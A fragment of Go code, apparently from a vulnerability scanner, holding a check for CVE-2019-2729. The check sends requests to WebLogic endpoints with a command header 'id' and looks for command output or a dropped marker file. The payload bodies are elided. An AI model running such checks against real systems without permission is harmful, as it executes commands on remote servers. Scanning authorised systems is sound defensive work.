...
func CVE_2019_2729(url string, client *httpx.Client) bool {
    payload1 := `
    ...
    header["cmd"] = "id"
    header["SOAPAction"] = ""
    if req1, err := client.Request(url+"/wls-wsat/CoordinatorPortType", "POST", payload1, header); err == nil {
        if req2, err2 := client.Request(url+"/_async/AsyncResponseService", "POST", payload2, header); err2 == nil {
            req3, _ := client.Request(url+"/_async/favicon.ico", "GET", "", nil)
            if (req1.StatusCode == 200 && strings.Contains(req1.Body, "uid")) || (req2.StatusCode == 202 && strings.Contains(req3.Body, "Vulnerable")) {
                logging.Logger.Infoln("[Vulnerable] CVE_2019_2729 ", url)
                return true
            }
        }
    }
    logging.Logger.Debugln("[Safety] CVE_2019_2729 ", url)
    return false
}
